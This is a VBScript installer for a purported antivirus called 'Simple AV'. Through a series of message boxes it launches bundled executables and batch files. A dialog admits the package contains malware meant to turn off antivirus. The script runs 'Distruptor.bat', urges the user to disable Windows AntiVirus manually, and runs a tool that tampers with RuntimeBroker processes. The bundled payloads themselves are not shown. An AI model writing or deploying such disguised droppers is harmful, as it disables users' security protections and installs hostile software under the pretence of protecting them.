DIM FSO, MyFile
Set oShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
' install python
answer = MsgBox("For some of this software to run properly you will need to install a computer language called python. If you dont have python click YES to install it, if you already have it click NO.", vbQuestion + vbYesNo + vbDefaultButton2, "Simple AV Alert")

If answer = vbYes Then
  WScript.sleep(5)
  CreateObject("WScript.Shell").Run "simple\extras\python.exe"
  a=MsgBox("Please close this prompt to move onto the next step.", 0+64, "Simple AV")
  
Else
  End If

  
  






answer = MsgBox("Disclaimer: Our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")

If answer = vbYes Then
  WScript.sleep(5) 
  CreateObject("WScript.Shell").Run "simple\Distruptor.bat"
  a=MsgBox("Files ran successfully...", 0+64, "Simple")
  b=MsgBox("Please finish the setup by manualy turning off your Windoes AntiVirus, this is to assure that our program will run properly.", 0+64, "Simple")
  c=MsgBox("Important: Some malware disguises itself as RuntimeBroker.exe, Isass.exe, MsDtsSrvr.exe or other common windows files..., particularly when not located in the C:\Windows\System32 folder. Therefore, you should check the RuntimeBroker.exe process on your PC to see if it is a threat. Because of this we will check if any of these are malware, if found we will fix the RuntimeBroker executable and replace it with a default one.", 0+64, "Simple")
  
  answer = MsgBox("Disclaimer: We want to scan your RuntimeBrokers and other processes... This will run the program 'BrokerFixer.exe' and will tamper with you runtime brokers even if they are not infected, it will then check the most common windows 10 background apps for anything Suspicious.    Would you like to run this task?", vbQuestion + vbYesNo + vbDefaultButton2, "???Question???")
  
  If answer = vbYes Then
    CreateObject("WScript.Shell").Run "simple\BrokerFixer.exe"
    CreateObject("WScript.Shell").Run "simple\TaskManager.py"
    WScript.sleep(500)
    d=MsgBox("Succesefull, close this prompt.", 0+64, "Simple")
    CreateObject("WScript.Shell").Run "simple\fix.bat"
    f=MsgBox("Close this prompt to run our antivirus.", 0+64, "Simple")
    CreateObject("WScript.Shell").Run "simple\complex\setup.exe"
 
  Else
    a=MsgBox("Thanks for making your decision... we will continue with our virus detection process ", 0+64, "SimpleAV")
    f=MsgBox("Click any button below to run our very simple antivirus", 0+64, "Simple")
    CreateObject("WScript.Shell").Run "simple\complex\setup.exe"
    
  End If
  
  
  

  
    
 
Else
  a=MsgBox(" Click OK or NO to close... ", 0+64, "SimpleAV")
  
End If
